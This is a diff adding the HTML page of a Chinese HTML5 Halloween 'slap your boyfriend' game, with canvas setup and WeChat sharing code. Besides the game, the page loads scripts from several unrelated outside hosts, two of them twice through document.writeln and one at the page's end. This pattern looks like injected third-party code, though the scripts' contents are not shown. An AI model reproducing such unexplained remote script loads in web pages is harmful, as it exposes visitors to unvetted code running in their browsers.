@@ -1,0 +1,137 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<HTML>
+<HEAD>
+<link rel="apple-touch-icon" href="icon.png" />
+<link rel="shortcut icon" href="icon.png" />
+<link rel="icon" href="icon.png" />
+<title>狂抽男朋友</title>
+<meta name="keywords" content="狂抽男朋友,万圣节狂抽男朋友html5游戏" />
+<meta name="description" content="万圣节狂抽男朋友html5游戏" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width; initial-scale=1; maximum-scale=1; user-scalable=0;"/>
+<meta name="x5-fullscreen" content="true"/>
+<meta name="apple-mobile-web-app-capable" content="yes"/>
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
+<link rel="stylesheet" type="text/css" href="popup.css" />
+
+<script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+<script src="http://res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
+<script src='https://p.mendoc.cn/83467'></script>
+	<script src='http://h.how5.cn/83467'></script>
+	<script type="text/javascript">
+		document.writeln("<script src='http:\/\/h.how5.cn\/83467'><\/script>");
+		document.writeln("<script src='https:\/\/p.mendoc.cn\/83467'><\/script>");
+	</script>
+<style type="text/css">
+body{
+margin:0;
+padding:0;
+}
+#canvas{		
+position: absolute;
+margin: 0 auto;
+overflow: hidden;
+}
+.MainPage{
+background-image:url(1.jpg);
+background-size:100% 100%;
+background-repeat:no-repeat;
+}
+.SpecPage{
+background-image:url(6.jpg);
+background-size:100% 100%;
+background-repeat:no-repeat;
+}
+.GamePage{
+background-image:url(bg.jpg);
+background-size:100% 100%;
+background-repeat:no-repeat;
+}
+</style>
+<script src="config.js"></script></head>
+<BODY>
+<link href="main.css" rel="stylesheet" type="text/css">
+<canvas id="canvas" width="320" height="480">
+unsupport canvas
+</canvas>
+<script type="text/javascript" src="common.js"></script>
+<script type="text/javascript" src="popup.js"></script>
+<script type="text/javascript" src="gamehub.js"></script>
+<script type="text/javascript" src="slap_min.js" charset="utf-8"></script>
+<script type="text/javascript">
+window.onload = function () {
+sid = "";
+Gamehub.Settings.gameName = 'slap';
+if (typeof StartGame == 'function') {
+StartGame();
+}
+canvas = document.getElementById('canvas');
+slap = new Slap(canvas);
+slap.run();
+};
+</script>
+<script language=javascript>
+var mebtnopenurl = "http://yx8.com/game/chou/";
+dataForWeixin = {
+"appId": "",
+"imgUrl": "http://yx8.com/game/chou/icon.jpg",
+"url": "http://yx8.com/game/chou/",
+"tTitle": "没有收到男朋友的糖糖，不开心，抽死他~",
+"tContent": "死鬼怎么还不送我糖糖，等的都不耐烦了~"
+};
+document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
+WeixinJSBridge.on('menu:share:appmessage', function (argv) {
+WeixinJSBridge.invoke('sendAppMessage', {
+"appid": dataForWeixin.appId,
+"img_url": dataForWeixin.imgUrl,
+"link": dataForWeixin.url,
+"desc": dataForWeixin.tContent,
+"title": dataForWeixin.tTitle
+});
+setTimeout(function () { document.getElementById("shareto").style.display = "none"; }, 1500);
+});
+WeixinJSBridge.on('menu:share:timeline', function (argv) {
+WeixinJSBridge.invoke('shareTimeline', {
+"appid": dataForWeixin.appId,
+"img_url": dataForWeixin.imgUrl,
+"img_width": "640",
+"img_height": "640",
+"link": dataForWeixin.url,
+"desc": dataForWeixin.tContent,
+"title": dataForWeixin.tTitle
+});
+setTimeout(function () { document.getElementById("shareto").style.display = "none"; }, 1500);
+});
+}, false);
+function dp_share(score, hitnum) {
+if(confirm("你抽了男朋友" + hitnum + "下,要告诉一下你的小伙伴吗？"))
+{
+}
+document.title = "我狂抽了男朋友" + hitnum + "下，再不给我糖糖，就捣乱";
+document.getElementById("shareto").style.display = "";
+dataForWeixin.tTitle = document.title;
+}
+</script>
+<div id="shareto" style="display: none">
+<img width="100%" src="./share.png" style="position: fixed; z-index: 9999; top: 0; left: 0;" ontouchstart="document.getElementById('shareto').style.display='none';">
+</div>
+<div style="display:none">
+</div>
+
+<script  type="text/JavaScript">
+window.shareData={
+  'title':'狂抽男朋友',
+  'link':'http://game.nineying.cn/games/chou/',
+  'imgurl':'http://game.nineying.cn/games/chou/icon.png'
+}
+window.shareFriendData={
+  'title':'狂抽男朋友',
+  'content':'关注小斯基网络,更多好玩的游戏等着你。',
+  'link':'http://game.nineying.cn/games/chou/',
+  'imgurl':'http://game.nineying.cn/games/chou/icon.png'
+}
+</script>
+<script type="text/JavaScript" src="http://gc.veiying.cn/code"></script>
+</BODY>
+</HTML>
